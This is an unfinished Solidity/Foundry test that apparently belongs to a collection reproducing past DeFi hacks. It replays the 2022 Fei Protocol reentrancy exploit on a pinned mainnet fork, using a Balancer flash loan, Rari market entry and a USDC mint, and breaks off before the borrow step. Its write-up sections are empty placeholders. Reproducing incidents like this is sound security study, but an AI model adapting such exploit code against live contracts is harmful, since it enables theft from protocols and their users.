// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";

import {IERC20} from "../interfaces/IERC20.sol";
import {WETH9} from "../interfaces/WETH9.sol";

// forge test --match-contract Exploit_PROTOCOL_NAME -vvv
/*
On Apr 30 2022, an attacker stolen ~80MM USD in multiple stablecoins from FeiProtocol.
An old school reentrancy attack with the root cause of not respecting the checks-effects-interactions pattern.
The attacker flashloaned multiple tokens and borrowed uncollateralized assets draining the pool. 

// Attack Overview
Total Lost: ~80MM USD
Attack Tx: https://etherscan.io/tx/0xab486012f21be741c9e674ffda227e30518e8a1e37a5f1d58d0b0d41f6e76530
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0xab486012f21be741c9e674ffda227e30518e8a1e37a5f1d58d0b0d41f6e76530

Exploited Contract: 
Attacker Address: https://etherscan.io/address/0x6162759edad730152f0df8115c698a42e666157f
Attacker Contract: https://etherscan.io/address/0xE39f3C40966DF56c69AA508D8AD459E77B8a2bc1, https://etherscan.io/address/0x32075bad9050d4767018084f0cb87b3182d36c45
Attack Block:  

// Key Info Sources
Twitter: https://twitter.com/peckshield/status/1520369315698016256
Writeup: https://certik.medium.com/fei-protocol-incident-analysis-8527440696cc
Code: 


Principle: VULN PRINCIPLE


ATTACK:
1)

MITIGATIONS:
1)

*/

interface IBalancer {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external payable;
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
}

interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
}

contract Exploit_Fei is TestHarness {
    IBalancer internal constant balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUnitroller internal constant unitroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
    ICERC20Delegator internal constant cerc20Delegator_USDC = ICERC20Delegator(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    ICERC20Delegator internal constant cerc20Delegator_ETH = ICERC20Delegator(0x26267e41CeCa7C8E0f143554Af707336f27Fa051);


    WETH9 internal constant weth =  WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address internal constant attacker = 0x6162759eDAd730152F0dF8115c698a42E666157F;

    // This contract acts as the exploiter contract.
    function setUp() external {
        cheat.createSelectFork("mainnet", 14684813); // We pin one block before the exploit happened.

        cheat.label(attacker, "Attacker");
    }

    function test_attack() external {
        address[] memory _tokens = new address[](2);
        _tokens[0] = address(usdc);
        _tokens[1] = address(weth);

        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = 150000000000000;
        _amounts[1] = 50000000000000000000000;
        
        balancer.flashLoan(address(this), _tokens, _amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens, 
        uint256[] memory amounts, 
        uint256[] memory , 
        bytes memory 
    ) external payable {
        require(msg.sender == address(balancer), "only callable by balancer");
        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
        require(address(tokens[0]) == address(usdc), "no usdc");
        require(address(tokens[1]) == address(weth), "no weth");
        
        // First enters the USDC borrow market
        address[] memory _cTokens = new address[](1); 
        _cTokens[0] = address(cerc20Delegator_USDC);
        exploiter_setup_function(_cTokens);

        uint256 usdcFlashLoanBalance = usdc.balanceOf(address(this));
        uint256 wethFlashLoanBalance = weth.balanceOf(address(this));

        console.log("Received Flashloan balances");
        emit log_named_decimal_uint("USDC", usdcFlashLoanBalance, 8);
        emit log_named_decimal_uint("WETH", wethFlashLoanBalance, 18);

        // Gives Approval so the mint succeeds
        usdc.approve(address(cerc20Delegator_USDC), type(uint256).max);

        cerc20Delegator_USDC.mint(usdcFlashLoanBalance);
        uint256 fUSDC_minted = cerc20Delegator_USDC.balanceOf(address(this));

        console.log("\nAfter minting balances");
        emit log_named_decimal_uint("fUSDC", fUSDC_minted, cerc20Delegator_USDC.decimals());
        emit log_named_decimal_uint("USDC", usdc.balanceOf(address(this)), 18);

        // With fETH and already entered the market, we can borrow.


    }

    function exploiter_setup_function(address[] memory ctokens) internal {
        unitroller.enterMarkets(ctokens);
    }



    

}